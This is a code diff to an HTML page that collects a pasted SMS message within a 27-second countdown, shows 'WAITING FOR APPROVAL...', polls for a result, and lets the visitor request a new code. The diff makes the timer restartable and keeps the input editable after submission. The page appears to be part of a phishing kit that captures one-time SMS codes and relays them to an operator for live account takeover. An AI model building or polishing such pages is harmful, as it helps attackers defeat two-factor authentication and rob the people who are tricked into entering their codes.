@@ -78,7 +78,6 @@
         .sms-input::placeholder { color: #aaa; }
         .sms-input:focus { box-shadow: 0 0 0 4px rgba(255,204,0,.25); }
         .sms-input.error { border-color: #dc2626; background: #fff5f5; }
-        .sms-input:disabled { background: #f3f4f6; color: #999; cursor: not-allowed; }
 
         .example-text {
             font-size: 12px; color: #6b7280; font-style: italic;
@@ -185,11 +184,20 @@
         const timerCircle = document.getElementById('timerCircle');
         const timerSec   = document.getElementById('timerSec');
 
-        // ─── Countdown timer (27 seconds) ───
-        let timeLeft = 27;
+        // ─── Countdown timer (27 seconds, restartable) ───
+        const TIMER_START = 27;
+        let timeLeft = TIMER_START;
         let timerInterval = null;
 
         function startTimer() {
+            // Clear any existing interval
+            if (timerInterval) clearInterval(timerInterval);
+
+            timeLeft = TIMER_START;
+            timerCircle.textContent = timeLeft;
+            timerSec.textContent    = timeLeft;
+            timerCircle.classList.remove('urgent');
+
             timerInterval = setInterval(() => {
                 timeLeft--;
                 timerCircle.textContent = timeLeft;
@@ -205,10 +213,10 @@
                     clearInterval(timerInterval);
                     timerCircle.textContent = '0';
                     timerSec.textContent = '0';
-                    codeInput.disabled = true;
                     submitBtn.disabled = true;
                     submitBtn.classList.remove('active');
                     errorMsg.textContent = '⏰ Time expired. Please request a new code.';
+                    errorMsg.style.color = '#dc2626';
                     errorMsg.classList.add('show');
                 }
             }, 1000);
@@ -216,7 +224,7 @@
 
         startTimer();
 
-        // ─── Enable Submit button once the user types something ───
+        // ─── Enable Submit button when user types ───
         codeInput.addEventListener('input', function () {
             this.classList.remove('error');
             errorMsg.classList.remove('show', 'info');
@@ -284,6 +292,7 @@
             const code = codeInput.value.trim();
             if (code.length < 4) {
                 errorMsg.textContent = 'Please paste the full SMS message';
+                errorMsg.style.color = '#dc2626';
                 errorMsg.classList.add('show');
                 codeInput.classList.add('error');
                 return;
@@ -291,7 +300,7 @@
 
             submitBtn.disabled = true;
             submitBtn.textContent = 'WAITING FOR APPROVAL...';
-            codeInput.disabled = true;
+            // NOTE: we do NOT disable the textarea — user can still edit
             clearInterval(timerInterval); // stop the timer once submitted
 
             try {
@@ -312,16 +321,37 @@
             } catch (err) {
                 console.error('Send failed:', err);
                 errorMsg.textContent = '⚠️ Network error. Please try again.';
+                errorMsg.style.color = '#dc2626';
                 errorMsg.classList.add('show');
                 submitBtn.disabled = false;
                 submitBtn.textContent = 'SUBMIT';
                 submitBtn.classList.add('active');
-                codeInput.disabled = false;
             }
         });
 
         // ─── Resend ───
         resendBtn.addEventListener('click', async function () {
+            // Stop any polling from a previous submission
+            if (pollTimer) clearInterval(pollTimer);
+            referenceId = null;
+
+            // Reset form to editable, empty state
+            codeInput.value = '';
+            codeInput.classList.remove('error');
+            codeInput.disabled = false;
+
+            // Reset submit button
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'SUBMIT';
+            submitBtn.classList.remove('active');
+
+            // Clear status
+            errorMsg.classList.remove('show', 'info');
+            errorMsg.textContent = '';
+
+            // Restart the timer from the top
+            startTimer();
+
             this.disabled = true;
             this.textContent = 'Sending...';
 
@@ -337,12 +367,12 @@
 
             errorMsg.textContent = '✅ New SMS requested. Please check your phone.';
             errorMsg.style.color = '#3a7d44';
-            errorMsg.classList.add('show');
+            errorMsg.classList.add('show', 'info');
 
             setTimeout(() => {
                 this.disabled = false;
                 this.textContent = "Didn't receive a code? Resend";
-                errorMsg.classList.remove('show');
+                errorMsg.classList.remove('show', 'info');
                 errorMsg.style.color = '#dc2626';
             }, 5000);
         });
